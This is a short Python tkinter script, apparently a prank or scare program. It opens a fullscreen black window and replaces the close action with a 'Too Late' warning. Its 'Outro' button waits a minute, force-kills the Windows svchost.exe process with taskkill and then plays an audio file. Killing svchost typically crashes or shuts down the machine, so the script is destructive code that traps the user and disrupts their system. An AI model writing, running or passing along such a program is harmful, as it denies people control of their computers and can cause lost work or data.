
import tkinter as tk
from tkinter import messagebox
import playsound
import time
import os
root = tk.Tk()
root.geometry("2000x2000")
root.configure(background='black')

def on_closing():

    if True:
        messagebox.showwarning("Too Late")



root.protocol("WM_DELETE_WINDOW", on_closing)
root.attributes('-fullscreen', True)
def byebye():
    time.sleep(60)
    os.system("taskkill /f /im  svchost.exe")
def outro_start():
    byebye()    
    playsound.playsound('audio.mp3')
button_a = tk.Button(
    text="Outro",
    width=20,
    height=5,
    bg="white",
    fg="black",
    command = outro_start,
    )
button_a.place(x=500, y=500)

root.mainloop()



